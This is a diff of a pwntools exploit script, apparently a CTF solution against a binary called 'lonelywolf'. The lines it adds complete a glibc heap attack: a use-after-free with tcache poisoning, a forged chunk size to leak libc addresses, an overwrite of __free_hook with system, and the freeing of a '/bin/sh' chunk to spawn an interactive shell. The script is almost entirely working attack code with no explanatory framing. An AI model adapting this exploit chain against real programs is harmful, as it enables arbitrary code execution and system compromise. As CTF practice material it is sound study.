@@ -1,11 +1,8 @@
-from json.tool import main
-from platform import architecture
 from pwn import *
 context(arch = "amd64", os = "Linux", log_level = "Debug")
 io = process("./lonelywolf")
-context.terminal = ['tmux','splitw','-h']
 # io = remote("124.70.130.92", 60001)
-gdb.attach(io)
+# gdb.attach(io)
 
 s       = lambda data               :io.send(data)
 sa      = lambda delim,data         :io.sendafter(str(delim), data)
@@ -58,7 +55,7 @@ delete()
 #chunk B
 add(0x38)
 #write prev_size of extended tcache info chunk
-edit(p64(0) * 6 + p64(0x440))
+edit(p64(0) * 6 + p64(0x430))
 delete()
 #self-looped, address in chunk
 #show after delete(UAF)
@@ -66,7 +63,7 @@ delete()
 add(0x20)
 delete()
 delete()
-pause()
+# pause()
 show()
 heap_addr = u64(rl()[:6].ljust(8, "\0"))
 heap_base_addr = heap_addr - 0x440
@@ -74,21 +71,41 @@ log.info("Heap addr (add offset 0x440) : " + hex(heap_base_addr))
 
 #edit pointer to point to heap base addr to edit size field
 edit(p64(heap_base_addr))
+# pause()
 #alloc middle chunks
 add(0x20)
 #alloc tcache info chunk(size:0x260)
 #because it is big enough to alloc a small chunk
 add(0x20)
-#edit size to 0x440, to the head of chunk A
-edit(p64(0) + p64(0x440))
+#edit size to 0x431, to the head of chunk A
+#! make sure the prev is inuse!!!(the first one)
+#! to avoid forward consolidate
+edit(p64(0) + p64(0x431))
 #edit chunk B prev_size field to bypass checking
 
 #prepare to alloc extended tcache info chunk
 add(0x10)
 delete()
 delete()
-edit(p64(heap_base_addr))
+edit(p64(heap_base_addr + 16))
 add(0x10)
-pause()
 add(0x10)
+delete()
+show()
+main_arena_addr = u64(rl()[:6].ljust(8, "\0")) - 96
+free_hook_addr = main_arena_addr + 0x1ca8
+system_addr = main_arena_addr - 0x36d4d0
+log.info("free hook addr: " + hex(free_hook_addr))
+log.info("system addr: " + hex(system_addr))
 
+add(0x30)
+delete()
+edit(p64(free_hook_addr))
+add(0x30)
+add(0x30)
+edit(p64(system_addr))
+
+add(0x40)
+edit("/bin/sh")
+delete()
+io.interactive()
